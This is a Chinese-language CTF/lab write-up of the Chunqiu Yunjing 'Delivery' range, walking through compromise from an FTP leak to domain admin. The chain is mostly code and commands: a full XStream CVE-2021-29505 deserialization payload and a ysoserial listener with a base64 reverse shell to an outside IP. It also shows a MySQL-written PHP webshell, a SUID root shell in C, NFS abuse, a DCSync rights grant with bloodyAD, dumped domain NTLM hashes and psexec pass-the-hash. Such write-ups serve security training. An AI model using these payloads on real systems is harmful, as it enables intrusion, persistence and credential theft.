## 文章

https://fushuling.com/index.php/2023/10/04/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7delivery/

https://exp10it.cn/2023/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-delivery-writeup/#flag03

https://zysgmzb.club/index.php/archives/252

## 打靶过程

fscan扫

```bash
[*] Icmp alive hosts len is: 1
39.99.137.53:22 open
39.99.137.53:21 open
39.99.137.53:8080 open
39.99.137.53:80 open
[*] alive ports len is: 4
start vulscan
[*] WebTitle: http://39.99.137.53       code:200 len:10918  title:Apache2 Ubuntu Default Page: It works
[+] ftp://39.99.137.53:21:anonymous
   [->]1.txt
   [->]pom.xml
[*] WebTitle: http://39.99.137.53:8080  code:200 len:3655   title:公司发货单
已完成 4/4
[*] 扫描结束,耗时: 15.1105046s
```

ftp匿名登录获取pom.xml

```html
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.7.2</version>
        <relativePath/> <!-- lookup parent from repository -->
    </parent>
    <groupId>com.example</groupId>
    <artifactId>ezjava</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <name>ezjava</name>
    <description>ezjava</description>
    <properties>
        <java.version>1.8</java.version>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-thymeleaf</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
        </dependency>

        <dependency>
            <groupId>com.thoughtworks.xstream</groupId>
            <artifactId>xstream</artifactId>
            <version>1.4.16</version>
        </dependency>

        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>

</project>

```

有xstream和CC,Xstream为1.4.16，打CVE-2021-29505

```bash
        <dependency>
            <groupId>com.thoughtworks.xstream</groupId>
            <artifactId>xstream</artifactId>
            <version>1.4.16</version>
        </dependency>

        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>
    </dependencies>
```

Exp

```bash
POST /just_sumbit_it HTTP/1.1
Host: 39.98.117.113:8080
Content-Length: 3117
Pragma: no-cache
Cache-Control: no-cache
Accept: application/xml, text/xml, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Content-Type: application/xml;charset=UTF-8
Origin: http://39.98.117.113:8080
Referer: http://39.98.117.113:8080/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

<java.util.PriorityQueue serialization='custom'>
    <unserializable-parents/>
    <java.util.PriorityQueue>
        <default>
            <size>2</size>
        </default>
        <int>3</int>
        <javax.naming.ldap.Rdn_-RdnEntry>
            <type>12345</type>
            <value class='com.sun.org.apache.xpath.internal.objects.XString'>
                <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content</m__obj>
            </value>
        </javax.naming.ldap.Rdn_-RdnEntry>
        <javax.naming.ldap.Rdn_-RdnEntry>
            <type>12345</type>
            <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>
                <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>
                    <parsedMessage>true</parsedMessage>
                    <soapVersion>SOAP_11</soapVersion>
                    <bodyParts/>
                    <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>
                        <attachmentsInitialized>false</attachmentsInitialized>
                        <nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>
                            <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>
                                <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>
                                    <names>
                                        <string>aa</string>
                                        <string>aa</string>
                                    </names>
                                    <ctx>
                                        <environment/>
                                        <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>
                                            <java.rmi.server.RemoteObject>
                                                <string>UnicastRef</string>
                                                <string>182.92.161.222</string>
                                                <int>1099</int>
                                                <long>0</long>
                                                <int>0</int>
                                                <long>0</long>
                                                <short>0</short>
                                                <boolean>false</boolean>
                                            </java.rmi.server.RemoteObject>
                                        </registry>
                                        <host>182.92.161.222</host>
                                        <port>1099</port>
                                    </ctx>
                                </candidates>
                            </aliases>
                        </nullIter>
                    </sm>
                </message>
            </value>
        </javax.naming.ldap.Rdn_-RdnEntry>
    </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

yso启rmi服务

```bash
 java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xODIuOTIuMTYxLjIyMi83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}"
```

反弹shell

![image-20231017003352612](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017003352612.png)

获取flag

![image-20231017003429061](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017003429061.png)

先写ssh公钥

xshell连接

传fscan、frp

fscan扫

```bash
(icmp) Target 172.22.13.14    is alive
(icmp) Target 172.22.13.6     is alive
(icmp) Target 172.22.13.28    is alive
(icmp) Target 172.22.13.57    is alive
[*] Icmp alive hosts len is: 4
172.22.13.28:3306 open
172.22.13.28:445 open
172.22.13.14:8080 open
172.22.13.6:445 open
172.22.13.28:8000 open
172.22.13.28:139 open
172.22.13.6:139 open
172.22.13.28:135 open
172.22.13.6:135 open
172.22.13.57:80 open
172.22.13.28:80 open
172.22.13.57:22 open
172.22.13.14:22 open
172.22.13.14:21 open
172.22.13.6:88 open
172.22.13.14:80 open
[*] alive ports len is: 16
start vulscan
[*] NetInfo:
[*]172.22.13.28
   [->]WIN-HAUWOLAO
   [->]172.22.13.28
[*] NetBios: 172.22.13.6     [+]DC XIAORANG\WIN-DC          
[*] WebTitle: http://172.22.13.57       code:200 len:4833   title:Welcome to CentOS
[*] WebTitle: http://172.22.13.14       code:200 len:10918  title:Apache2 Ubuntu Default Page: It works
[*] NetBios: 172.22.13.28    WIN-HAUWOLAO.xiaorang.lab           Windows Server 2016 Datacenter 14393 
[*] WebTitle: http://172.22.13.14:8080  code:200 len:3655   title:公司发货单
[+] ftp://172.22.13.14:21:anonymous 
   [->]1.txt
   [->]pom.xml
[*] WebTitle: http://172.22.13.28       code:200 len:2525   title:欢迎登录OA办公平台
[*] NetInfo:
[*]172.22.13.6
   [->]WIN-DC
   [->]172.22.13.6
[*] WebTitle: http://172.22.13.28:8000  code:200 len:170    title:Nothing Here.
[+] mysql:172.22.13.28:3306:root 123456
```

frp挂代理

mysql弱密码连接

MySQL写WebShell

```bash
select "<?php $arr = [$_POST[Ki1ro],$_REQUEST[Ki1ro]];@assert($arr[mt_rand(0,1)]);?>" into outfile "C:/phpstudy_pro/WWW/1.php";
```

蚁剑连获取flag

![image-20231017005539831](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017005539831.png)

有NFS提权的，那应该就是172.22.13.57 这台了

用nfs写ssh公钥连接

再写个suid文件给用户进行提权

```bash
#include<unistd.h>
void main()
{
        setuid(0);
        setgid(0);
        system("/bin/bash");
}
```

获取flag

![image-20231017011111113](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017011111113.png)

还有个域用户密码

![image-20231017011152632](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017011152632.png)

应该是172.22.13.28的，直接rdp

其实刚才蚁剑已经获取了172.22.13.28的system权限，直接传猕猴桃到hash

chenglei的密码直接可以取出

![image-20231017011843037](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017011843037.png)

传个sharphound导一下域信息

因为chenglei有WriteDACL权限，直接给zhangwen写个dcsync，然后到域管理员hash

```bash
python bloodyAD.py -d xiaorang.lab -u 'chenglei' -p 'Xt61f3LBhg1' --host 172.22.13.6 add dcsync zhangwen
lsadump::dcsync /domain:xiaorang.lab /all /csv
```

```bash
502     krbtgt  cb976ec1a1bf8a14a15142c6fecc540e        514
1106    zhangtao        e786c4a4987ced162c496d0519496729        512
1000    WIN-DC$ 27c19858fdbae33ee3109b2e102323eb        532480
500     Administrator   6341235defdaed66fb7b682665752c9a        512
1105    chenglei        0c00801c30594a1b8eaa889d237c5382        512
1103    WIN-HAUWOLAO$   6a39862c5edcb4fce18f838a6bb5f1fd        4096
1104    zhangwen        fa7d776fdfc82d3f43c9d8b7f5312d77        512
```

psexec横移获取flag

```bash
python psexec.py -hashes :6341235defdaed66fb7b682665752c9a xiaorang.lab/administrator@172.22.13.6 -codec gbk
```

![image-20231017013754740](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231017013754740.png)